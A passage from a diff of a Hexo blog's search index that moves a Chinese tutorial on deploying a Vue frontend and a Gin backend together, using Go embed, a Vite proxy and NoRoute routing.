-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite build &amp;&amp; robocopy ./dist 后端路径/vue /e /z /r:0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;preview&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite preview&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
-
-<p>方便一部送到位</p>
-<h2 id="gin"><a href="#gin" class="headerlink" title="gin"></a>gin</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">❯ tree</span><br><span class="line">文件夹 <span class="selector-tag">PATH</span> 列表</span><br><span class="line">卷序列号为 AE05-<span class="number">588</span>D</span><br><span class="line">C:.</span><br><span class="line">├─main.go</span><br><span class="line">├─其他</span><br><span class="line">└─vue <span class="comment">/* 可改 */</span></span><br><span class="line">    └─assets</span><br></pre></td></tr></table></figure>
-
-<p>main.go 添加 embed 和路由</p>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//go:embed  vue/index.html</span></span><br><span class="line"><span class="keyword">var</span> indexHtml []<span class="type">byte</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed  vue/*</span></span><br><span class="line"><span class="keyword">var</span> vue embed.FS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 其他设置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配置允许跨域 方便dev联调</span></span><br><span class="line">	r.Use(cors.New(cors.Config&#123;</span><br><span class="line">		AllowOrigins:     []<span class="type">string</span>&#123;<span class="string">&quot;*&quot;</span>&#125;, <span class="comment">// 允许的域名</span></span><br><span class="line">		AllowMethods:     []<span class="type">string</span>&#123;<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;DELETE&quot;</span>&#125;,</span><br><span class="line">		AllowHeaders:     []<span class="type">string</span>&#123;<span class="string">&quot;Origin&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;Authorization&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>&#125;,</span><br><span class="line">		AllowCredentials: <span class="literal">true</span>,</span><br><span class="line">	&#125;))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 配置vue路由</span></span><br><span class="line">	assets, _ := fs.Sub(vue, <span class="string">&quot;vue/assets&quot;</span>)</span><br><span class="line">	r.StaticFS(<span class="string">&quot;/assets&quot;</span>, http.FS(assets))</span><br><span class="line">	icon, _ := fs.ReadFile(vue, <span class="string">&quot;vue/favicon.ico&quot;</span>)</span><br><span class="line">	r.GET(<span class="string">&quot;/favicon.ico&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123; c.Data(<span class="number">200</span>, <span class="string">&quot;image/x-icon&quot;</span>, icon) &#125;)</span><br><span class="line">	r.NoRoute(<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.Data(<span class="number">200</span>, <span class="string">&quot;text/html; charset=utf-8&quot;</span>, indexHtml)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 其他路由</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>使用<code>r.NoRoute</code>将非后端路由全部导向 index.html，并由 index.html 获取 css、js 等</p>
-<p>vue 中设置的 router 会被 build 进 js</p>
-<p>通过 js 获取 url 来切换页面</p>
-<p>对未使用 embed 的方法同理，参考代码自行设置</p>
-<h3 id="embed"><a href="#embed" class="headerlink" title="embed"></a>embed</h3><p>对于使用<code>embed</code>的</p>
-<p>由于<code>StaticFS</code>和<code>embed</code>的底层代码逻辑</p>
-<blockquote>
-<p>在前端根目录的文件一般不多，这里只有<code>index.html</code>和 icon 文件</p>
-</blockquote>
-<p>可通过单独获取、或通过<code>fs.ReadFile</code>获取，分别参考<code>index.html</code>和<code>favicon.ico</code></p>
-<p>对于前端其他文件，需要通过<code>fs.Sub</code>下移到对应目录后才能通过<code>r.StaticFS(&quot;/assets&quot;, http.FS(assets))</code>配置路由，且前端文件夹名和后端路由必须相同，二者缺一不可，否则会出现空白页面，即请求 js 等文件不存在的，页面无法加载等情况</p>
-]]></content>
-      <categories>
-        <category>教程</category>
-      </categories>
-      <tags>
-        <tag>vue</tag>
-        <tag>gin</tag>
-        <tag>golang</tag>
       </tags>
   </entry>
   <entry>
@@ -1365,6 +1346,52 @@
         <tag>web</tag>
         <tag>upload</tag>
         <tag>upload-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vue gin合并部署(完美方案)</title>
+    <url>/2024/12/vue%20gin%E5%90%88%E5%B9%B6%E9%83%A8%E7%BD%B2/</url>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>目前 vue 与 gin 的项目基本都是前后端分离部署</p>
+<p>二者合并部署的教程非常少，且各有各的问题</p>
+<p>结合各个教程后 找到一种比较完美的合并部署方案</p>
+<h2 id="vue"><a href="#vue" class="headerlink" title="vue"></a>vue</h2><p>使用 axios 时进行如下配置</p>
+<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> request = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">`<span class="subst">$&#123;currentDomain&#125;</span>/api`</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">5000</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123; <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span> &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>对 baseURL 进行设置是为了能够使用户请求时，前后端的域名端口完全一致，避免造成跨域（<strong>必须</strong>）</p>
+<p>并且对于非域名部署的情况，能够方便地动态调整，避免写死 baseURL</p>
+<p>headers 的设置是为了 vue dev 环境下，前后端的联调</p>
+<p>同时</p>
+<p>为了 dev 联调避免出现跨域问题，还应添加代理</p>
+<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="comment">// 其他参数</span></span><br><span class="line">  <span class="attr">server</span>: &#123;</span><br><span class="line">    <span class="comment">// port: 8080,</span></span><br><span class="line">    <span class="comment">// open: true,</span></span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="string">&quot;/api&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&quot;http://localhost:5731&quot;</span>,</span><br><span class="line">        <span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// rewrite: (path) =&gt; path.replace(/^\/api/, &quot;&quot;), // 移除 /api 前缀 根据前后端代码 自行修改</span></span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>额外配置 build 后任务，将构建好的 dist 复制到后端目录下</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite build &amp;&amp; robocopy ./dist 后端路径/vue /e /z /r:0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;preview&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite preview&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
+
+<p>方便一部送到位</p>
+<h2 id="gin"><a href="#gin" class="headerlink" title="gin"></a>gin</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">❯ tree</span><br><span class="line">文件夹 <span class="selector-tag">PATH</span> 列表</span><br><span class="line">卷序列号为 AE05-<span class="number">588</span>D</span><br><span class="line">C:.</span><br><span class="line">├─main.go</span><br><span class="line">├─其他</span><br><span class="line">└─vue <span class="comment">/* 可改 */</span></span><br><span class="line">    └─assets</span><br></pre></td></tr></table></figure>
+
+<p>main.go 添加 embed 和路由</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//go:embed  vue/index.html</span></span><br><span class="line"><span class="keyword">var</span> indexHtml []<span class="type">byte</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed  vue/*</span></span><br><span class="line"><span class="keyword">var</span> vue embed.FS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 其他设置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配置允许跨域 方便dev联调</span></span><br><span class="line">	r.Use(cors.New(cors.Config&#123;</span><br><span class="line">		AllowOrigins:     []<span class="type">string</span>&#123;<span class="string">&quot;*&quot;</span>&#125;, <span class="comment">// 允许的域名</span></span><br><span class="line">		AllowMethods:     []<span class="type">string</span>&#123;<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;DELETE&quot;</span>&#125;,</span><br><span class="line">		AllowHeaders:     []<span class="type">string</span>&#123;<span class="string">&quot;Origin&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;Authorization&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>&#125;,</span><br><span class="line">		AllowCredentials: <span class="literal">true</span>,</span><br><span class="line">	&#125;))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 配置vue路由</span></span><br><span class="line">	assets, _ := fs.Sub(vue, <span class="string">&quot;vue/assets&quot;</span>)</span><br><span class="line">	r.StaticFS(<span class="string">&quot;/assets&quot;</span>, http.FS(assets))</span><br><span class="line">	icon, _ := fs.ReadFile(vue, <span class="string">&quot;vue/favicon.ico&quot;</span>)</span><br><span class="line">	r.GET(<span class="string">&quot;/favicon.ico&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123; c.Data(<span class="number">200</span>, <span class="string">&quot;image/x-icon&quot;</span>, icon) &#125;)</span><br><span class="line">	r.NoRoute(<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.Data(<span class="number">200</span>, <span class="string">&quot;text/html; charset=utf-8&quot;</span>, indexHtml)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 其他路由</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>r.NoRoute</code>将非后端路由全部导向 index.html，并由 index.html 获取 css、js 等</p>
+<p>vue 中设置的 router 会被 build 进 js</p>
+<p>通过 js 获取 url 来切换页面</p>
+<p>对未使用 embed 的方法同理，参考代码自行设置</p>
+<h3 id="embed"><a href="#embed" class="headerlink" title="embed"></a>embed</h3><p>对于使用<code>embed</code>的</p>
+<p>由于<code>StaticFS</code>和<code>embed</code>的底层代码逻辑</p>
+<blockquote>
+<p>在前端根目录的文件一般不多，这里只有<code>index.html</code>和 icon 文件</p>
+</blockquote>
+<p>可通过单独获取、或通过<code>fs.ReadFile</code>获取，分别参考<code>index.html</code>和<code>favicon.ico</code></p>
+<p>对于前端其他文件，需要通过<code>fs.Sub</code>下移到对应目录后才能通过<code>r.StaticFS(&quot;/assets&quot;, http.FS(assets))</code>配置路由，且前端文件夹名和后端路由必须相同，二者缺一不可，否则会出现空白页面，即请求 js 等文件不存在的，页面无法加载等情况</p>
+]]></content>
+      <categories>
+        <category>教程</category>
+      </categories>
+      <tags>
+        <tag>vue</tag>
+        <tag>gin</tag>
+        <tag>golang</tag>
       </tags>
   </entry>
   <entry>
